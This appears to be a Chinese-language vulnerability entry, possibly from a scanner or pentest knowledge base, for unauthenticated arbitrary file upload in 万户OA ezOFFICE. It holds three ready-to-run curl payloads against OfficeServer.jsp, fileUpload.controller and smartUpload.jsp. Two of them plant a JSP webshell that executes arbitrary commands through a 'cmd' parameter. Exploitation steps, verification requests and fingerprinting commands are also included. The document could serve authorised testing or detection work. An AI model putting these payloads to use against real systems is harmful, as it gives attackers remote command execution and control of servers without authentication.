---
id: WANHU-FILE-UPLOAD
title: 万户OA ezOFFICE 多接口任意文件上传漏洞
product: wanhu-oa
vendor: 万户网络
version_affected: "all versions"
severity: CRITICAL
tags: [file_upload, rce, 无需认证, 国产, oa]
fingerprint: ["万户", "ezOFFICE", "万户网络"]
---

## 漏洞描述

万户OA（ezOFFICE）存在多个未授权文件上传接口，包括 OfficeServer.jsp、fileUpload.controller 和 smartUpload.jsp，攻击者无需认证即可上传任意 JSP 文件（webshell），获取服务器控制权限。

## 影响版本

- 万户OA ezOFFICE（所有已知版本）

## 前置条件

- 无需认证
- 目标运行万户OA ezOFFICE
- Web 应用端口可达

## 利用步骤

1. 通过指纹确认目标为万户OA
2. 选择可用的文件上传接口发送上传请求
3. 上传 JSP webshell
4. 访问上传的 webshell 执行命令

## Payload

**方式一：OfficeServer.jsp 上传（DBSTEP 协议）**

```bash
curl -s "http://target/defaultroot/public/iWebOfficeSign/OfficeServer.jsp" \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  -d 'DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vcHVibGljL2VkaXQvc2hlbGwuanNw
111111111111111111111111111111111111111111111111
<% out.println("WANHU_VULN_TEST"); %>'
```

上传后访问：`http://target/defaultroot/public/edit/shell.jsp`

**方式二：fileUpload.controller 上传（Multipart）**

```bash
curl -s "http://target/defaultroot/upload/fileUpload.controller" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream

<% out.println(Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
------Boundary--'
```

上传后访问：`http://target/defaultroot/upload/html/<返回的文件名>.jsp`

**方式三：smartUpload.jsp 上传（fileType 白名单包含 jsp）**

```bash
curl -s "http://target/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="photo"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println(Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
------Boundary
Content-Disposition: form-data; name="continueUpload"

1
------Boundary--'
```

上传后访问：`http://target/defaultroot/upload/information/<返回的文件名>.jsp`

## 验证方法

```bash
# 验证 OfficeServer.jsp 上传后的 webshell
curl -s "http://target/defaultroot/public/edit/shell.jsp" | grep "WANHU_VULN_TEST"

# 验证 fileUpload.controller 上传
curl -s "http://target/defaultroot/upload/html/" -o /dev/null -w "%{http_code}"

# 验证 smartUpload.jsp 上传
curl -s "http://target/defaultroot/upload/information/" -o /dev/null -w "%{http_code}"
```

## 指纹确认

```bash
curl -s "http://target/defaultroot/" | grep -i "ezOFFICE\|万户"
curl -s "http://target/defaultroot/login.jsp" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://www.cnblogs.com/wanhu-oa/
